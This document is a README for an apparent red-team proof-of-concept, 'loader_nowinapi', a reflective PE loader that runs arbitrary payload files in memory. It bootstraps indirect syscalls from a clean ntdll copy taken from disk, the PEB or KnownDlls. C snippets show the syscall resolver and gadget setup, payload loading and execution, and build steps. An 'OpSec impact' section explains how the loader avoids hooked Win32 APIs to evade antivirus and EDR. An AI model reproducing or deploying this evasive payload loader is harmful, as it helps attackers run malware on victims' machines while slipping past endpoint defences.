# PoC: loader_nowinapi

**Location:** `pocs/loader_nowinapi/`

Evasive local reflective loading without Win32 memory/module APIs. Uses NT API resolution (`snd_mem_nt`, `snd_mod_nt`) after bootstrapping the syscall pipeline with a clean `ntdll` base.

## What it demonstrates

- Syscall pipeline bootstrap (`snd_syscall_set_ntdll`, cascading resolvers)
- Same loader chain as `loader_winapi` with different injected API tables
- Three commented alternatives for obtaining `ntdll` (disk, PEB, KnownDlls)
- DLL export FFI (`-e`/`-a`) identical to the Win32 PoC

## Command-line usage

Same flags as `loader_winapi`:

```text
loader_nowinapi -f <payload_path> [-e <export_name>] [-a <arg>]...
```

## Walkthrough

### 1. Bootstrap `ntdll` for syscall resolution

The PoC loads `ntdll.dll` from disk into a buffer and registers it as the syscall scan base:

```c
snd_buffer_t ntdll_buf = {0};
status = snd_disk_buffer_load("C:\\Windows\\System32\\ntdll.dll", &ntdll_buf);
PVOID ntdll = ntdll_buf.data;

snd_syscall_set_ntdll(ntdll);
snd_syscall_set_resolver(snd_syscall_resolve_ssn_scan);
snd_syscall_add_resolver(snd_syscall_resolve_ssn_sort);
snd_syscall_set_invoker(snd_syscall_indirect_invoke_asm);
snd_syscall_set_gadget_finder(snd_syscall_find_gadget_scan);
```

Commented alternatives in `pocs/loader_nowinapi/main.c` (swap in for different OpSec trade-offs):

```c
// PEB walk — no disk read (correct API):
status = snd_peb_get_module_base_hash(SND_HASH_NTDLL_DLL, &ntdll);

// KnownDlls — unhooked section mapping
status = snd_om_knowndll_map(&snd_map_nt, L"ntdll.dll", &ntdll);
```

> [!NOTE]
> The commented PEB block in source currently calls `snd_peb_get_module_base(SND_HASH_NTDLL_DLL, …)` — that is incorrect (first argument must be a wide module name, not a hash). Use `snd_peb_get_module_base_hash` as shown above.

### 2. Inject NT primitives

```c
ctx.mem_api = &snd_mem_nt;   // NtAllocateVirtualMemory via PEB + EAT
ctx.mod_api = &snd_mod_nt;   // PEB walk + manual export parsing
```

> [!NOTE]
> This PoC uses `_nt` backends, not `_sys`. The syscall pipeline is bootstrapped so you can swap `ctx.mem_api` to `&snd_mem_sys` without other changes. See [inject_pe.md](inject_pe.md) for a full `_sys` profile.

### 3. Load, prepare, execute

```c
status = snd_disk_buffer_load(file_path, &file_buf);
ctx.raw_source = &file_buf;

status = snd_ldr_pe_prepare_image(&ctx);
status = snd_ldr_pe_execute_image(&ctx);

// Optional DLL export via snd_ldr_pe_get_proc_address + snd_ffi_execute
```

### 4. Cleanup

```c
snd_ldr_pe_detach_image(&ctx);
snd_ldr_pe_free_mapped_image(&ctx);
snd_buffer_free(&file_buf);
```

## Building

```bash
cmake -B build -DSND_BUILD_PAYLOADS=ON
cmake --build build --config Release
```

## OpSec impact

Avoids `VirtualAlloc`, `LoadLibraryA`, and `GetProcAddress`. Memory and imports still execute through in-process `ntdll` stubs (inline hooks may fire). Disk read of `ntdll.dll` may be logged by AV.

## See also

- [Syscall pipeline](../domains/primitives/syscalls/pipeline.md)
- [loader_winapi.md](loader_winapi.md) — Win32 baseline
- [inject_pe.md](inject_pe.md) — full `_sys` cross-process profile
